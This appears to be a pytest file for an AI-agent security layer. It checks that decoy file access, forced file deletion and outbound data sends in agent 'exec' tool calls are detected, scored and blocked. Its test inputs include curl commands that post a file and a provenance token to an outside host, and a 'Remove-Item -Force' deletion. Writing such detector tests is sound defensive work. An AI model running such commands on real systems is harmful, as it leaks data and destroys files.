"""
OpenClaw 真实 exec 接入场景检测测试。

覆盖：
- command 参数中的文件引用提取
- exec 命令触达诱饵文件名 → DecoyManager 命中
- exec 普通命令不误报
- read_document 专有字段回归
- Orchestrator exec 诱饵命中 → block
- exec 删除/外发命令风险加分
- BehaviorObserver 对 exec 产生 virtual_hit
- Data Provenance Token 扫描 exec 外发参数
"""

from src.security import create_orchestrator
from src.security.behavior_observer import BehaviorObserver
from src.security.data_provenance import DataProvenanceTracker
from src.security.decoy_manager import DecoyManager
from src.security.file_access import extract_file_references
from src.security.parameter_checker import ParameterChecker


def test_extract_file_references_from_command():
    refs = extract_file_references(
        {
            "command": (
                'cd "E:\\GovAgent-demo\\demos\\02_finance_budget"; '
                'python _audit_tmp.py; type "财务预算审批表.xlsx"'
            )
        }
    )

    assert any("02_finance_budget" in r for r in refs)
    assert any("_audit_tmp.py" in r for r in refs)
    assert any("财务预算审批表.xlsx" in r for r in refs)


def test_exec_command_hits_decoy_filename():
    manager = DecoyManager()
    manager.setup()

    result = manager.check_access(
        "exec",
        {"command": 'type "财务预算审批表.xlsx"'},
    )

    assert result["triggered"] is True
    assert result["risk_score"] == 1.0


def test_exec_normal_command_not_triggered():
    manager = DecoyManager()
    manager.setup()

    result = manager.check_access(
        "exec",
        {"command": "python _audit_tmp.py"},
    )

    assert result["triggered"] is False


def test_read_document_file_path_regression():
    manager = DecoyManager()
    manager.setup()

    result = manager.check_access(
        "read_document",
        {"file_path": "人事信息汇总.pdf"},
    )

    assert result["triggered"] is True


def test_orchestrator_exec_decoy_blocks():
    orc = create_orchestrator()

    result = orc.check_tool_call(
        "exec-decoy-session",
        "exec",
        {"command": 'type "财务预算审批表.xlsx"'},
        agent_id="admin_agent",
    )

    assert result["decoy"]["triggered"] is True
    assert result["blocked"] is True
    assert result["risk_level"] in ("CRITICAL", "VERY_HIGH")


def test_parameter_checker_exec_destructive():
    checker = ParameterChecker()

    result = checker.check(
        "exec",
        {"command": "Remove-Item _audit_tmp.py -Force"},
    )

    assert result["risk_score"] >= 0.5
    assert result["findings"]


def test_parameter_checker_exec_external():
    checker = ParameterChecker()

    result = checker.check(
        "exec",
        {"command": "curl http://partner.example.com/upload -d report.txt"},
    )

    assert result["risk_score"] >= 0.3
    assert any("外发" in f or "外部" in f for f in result["findings"])


def test_parameter_checker_exec_read_low_risk():
    checker = ParameterChecker()

    result = checker.check(
        "exec",
        {"command": 'type "public_notice.md"'},
    )

    assert result["risk_score"] == 0.0


def test_orchestrator_exec_destructive_risk_elevated():
    orc = create_orchestrator()

    result = orc.check_tool_call(
        "exec-risk-session",
        "exec",
        {"command": "Remove-Item _audit_tmp.py -Force"},
        agent_id="admin_agent",
    )

    assert result["risk_score"] >= 0.5
    assert result["param_findings"]


def test_behavior_observer_exec_virtual_hit():
    observer = BehaviorObserver()
    result = observer.observe(
        "exec",
        {"command": 'type "财务预算审批表.xlsx"'},
        {
            "matched": True,
            "asset_type": "financial_document",
            "sensitivity": "HIGH",
        },
    )

    assert result["virtual_hit"] is True
    assert result["rule_id"] == "virtual-fin-001"
    assert result["risk_increment"] <= 0.05


def test_data_provenance_scans_exec_command():
    tracker = DataProvenanceTracker()
    tracker.register("sess-exec-dpt", "call-1", "DPT-exec-001")

    result = tracker.scan_leak(
        "exec",
        {"command": "curl http://partner.example.com -d DPT-exec-001"},
    )

    assert result["hit"] is True
    assert result["token"] == "DPT-exec-001"
